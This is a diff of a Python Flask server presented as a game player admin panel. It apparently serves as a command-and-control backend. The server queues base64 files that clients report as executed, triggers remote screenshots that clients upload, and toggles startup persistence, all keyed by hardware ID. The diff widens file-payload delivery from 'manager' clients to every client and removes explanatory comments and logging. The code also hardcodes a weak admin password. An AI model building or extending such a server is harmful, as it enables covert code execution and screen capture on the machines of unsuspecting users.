@@ -1,12 +1,9 @@
 from flask import Flask, request, jsonify, render_template_string, send_file
-import json
-import os
-import base64
+import json, os, base64
 from datetime import datetime, timedelta
 
 app = Flask(__name__)
 
-# ===== CORS support =====
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')
@@ -14,7 +11,6 @@ def after_request(response):
     response.headers.add('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
     return response
 
-# ===== Persistent storage =====
 DATA_FILE = "players_data.json"
 SCREENSHOT_DIR = "screenshots"
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)
@@ -33,10 +29,10 @@ def save_data(data):
         json.dump(data, f, indent=4)
 
 PLAYERS = load_data()
-PENDING_FILES = {}        # hwid -> {'filename': name, 'content_b64': base64, 'status': 'queued'}
-screenshot_requests = {}  # hwid -> True (pending)
-screenshot_files = {}     # hwid -> filename (ready for download)
-startup_requests = {}     # hwid -> True/False (pending toggle)
+PENDING_FILES = {}
+screenshot_requests = {}
+screenshot_files = {}
+startup_requests = {}
 
 ADMIN_PASSWORD = "admin123"  # CHANGE THIS!
 
@@ -45,7 +41,7 @@ def add_username(hwid, username):
         PLAYERS[hwid].setdefault('usernames', []).append(username)
 
 # ============================================
-# HTML ADMIN DASHBOARD (Two tabs)
+# DASHBOARD HTML (two tabs)
 # ============================================
 DASHBOARD_HTML = """
 <!DOCTYPE html>
@@ -424,7 +420,7 @@ def admin_panel():
                                    now=now.strftime("%H:%M:%S"))
 
 # ============================================
-# CLIENT API
+# REGISTER (filtered)
 # ============================================
 @app.route('/register', methods=['POST'])
 def register():
@@ -432,8 +428,7 @@ def register():
     hwid = data.get('hwid')
     username = data.get('username', '')
     client_type = data.get('type', 'main')
-    print(f"[SERVER] Register: HWID={hwid[:8]}..., type={client_type}, username={username}")  # debug
-
+    
     if not hwid:
         return jsonify({'error': 'missing hwid'}), 400
 
@@ -458,26 +453,27 @@ def register():
         'settings_override': PLAYERS[hwid].get('settings_override', {})
     }
 
-    # Only send commands to 'manager' clients
+    # --- File payload: send to ALL clients ---
+    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
+        response['file_payload'] = {
+            'filename': PENDING_FILES[hwid]['filename'],
+            'content_b64': PENDING_FILES[hwid]['content_b64']
+        }
+        PENDING_FILES[hwid]['status'] = 'delivered'
+        print(f"[+] Delivered file to {hwid[:8]}...: {PENDING_FILES[hwid]['filename']}")
+
+    # --- Only send screenshot/startup to 'manager' clients ---
     if client_type == 'manager':
         if hwid in screenshot_requests and screenshot_requests[hwid]:
             response['screenshot'] = True
             del screenshot_requests[hwid]
-            print(f"[SERVER] Sent screenshot request to {hwid[:8]}...")
+            print(f"[+] Sent screenshot to manager {hwid[:8]}...")
 
         if hwid in startup_requests:
             response['startup'] = startup_requests[hwid]
             PLAYERS[hwid]['startup'] = startup_requests[hwid]
             del startup_requests[hwid]
-            print(f"[SERVER] Sent startup toggle to {hwid[:8]}...")
-
-        if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
-            response['file_payload'] = {
-                'filename': PENDING_FILES[hwid]['filename'],
-                'content_b64': PENDING_FILES[hwid]['content_b64']
-            }
-            PENDING_FILES[hwid]['status'] = 'delivered'
-            print(f"[+] Delivered file to {hwid[:8]}...: {PENDING_FILES[hwid]['filename']}")
+            print(f"[+] Sent startup toggle to manager {hwid[:8]}...")
 
     if status == 'kicked':
         PLAYERS[hwid]['status'] = 'active'
@@ -487,7 +483,7 @@ def register():
     return jsonify(response)
 
 # ============================================
-# ACKNOWLEDGMENT ENDPOINT
+# ACKNOWLEDGMENT
 # ============================================
 @app.route('/ack', methods=['POST'])
 def ack():
@@ -497,13 +493,13 @@ def ack():
     status = data.get('status', 'executed')
     if hwid in PENDING_FILES and PENDING_FILES[hwid].get('filename') == filename:
         PENDING_FILES[hwid]['status'] = status
-        print(f"[+] Acknowledgment from {hwid[:8]}...: {filename} - {status}")
+        print(f"[+] Ack from {hwid[:8]}...: {filename} - {status}")
     else:
-        print(f"[!] Acknowledgment from unknown: {hwid[:8]}... - {filename}")
+        print(f"[!] Ack unknown: {hwid[:8]}... - {filename}")
     return '', 204
 
 # ============================================
-# SCREENSHOT UPLOAD (from client)
+# SCREENSHOT UPLOAD
 # ============================================
 @app.route('/upload_screenshot', methods=['POST'])
 def upload_screenshot():
@@ -523,7 +519,7 @@ def upload_screenshot():
         print(f"[+] Screenshot saved for {hwid[:8]}...: {filename}")
         return jsonify({'status': 'ok'})
     except Exception as e:
-        print(f"[!] Screenshot save error: {e}")
+        print(f"[!] Screenshot error: {e}")
         return jsonify({'error': str(e)}), 500
 
 # ============================================
@@ -567,7 +563,7 @@ def serve_screenshot(filename):
     return send_file(os.path.join(SCREENSHOT_DIR, filename))
 
 # ============================================
-# ADMIN ACTIONS
+# ADMIN ACTIONS (ban, unban, kick, settings, upload_file)
 # ============================================
 @app.route('/admin/ban', methods=['POST'])
 def ban_player():
